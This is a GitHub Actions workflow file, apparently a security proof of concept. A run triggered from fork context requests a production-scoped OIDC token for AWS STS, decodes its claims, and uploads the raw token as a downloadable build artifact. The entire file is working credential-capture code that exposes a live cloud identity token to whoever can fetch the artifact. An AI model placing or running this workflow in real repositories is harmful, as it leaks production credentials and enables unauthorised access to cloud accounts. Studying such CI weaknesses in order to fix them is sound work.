name: OIDC workflow_run Token Capture
on:
  workflow_run:
    workflows: ["PR Trigger (fork context)"]
    types: [completed]
permissions:
  id-token: write
  contents: read
jobs:
  capture-oidc:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Capture OIDC token sub claim
        run: |
          FULL_JWT=$(curl -sS \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$FULL_JWT" > /tmp/oidc_token.txt
          PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
          echo "$PAYLOAD" | python3 -c "
          import sys, base64, json
          d = sys.stdin.read().strip()
          p = d + chr(61) * (4 - len(d) % 4)
          j = json.loads(base64.urlsafe_b64decode(p))
          print(json.dumps({k:j[k] for k in [\"actor\",\"event_name\",\"ref\",\"sub\",\"workflow\",\"head_ref\"] if k in j}, indent=2))"
      - uses: actions/upload-artifact@v4
        with:
          name: workflow-run-oidc-token
          path: /tmp/oidc_token.txt
          retention-days: 1

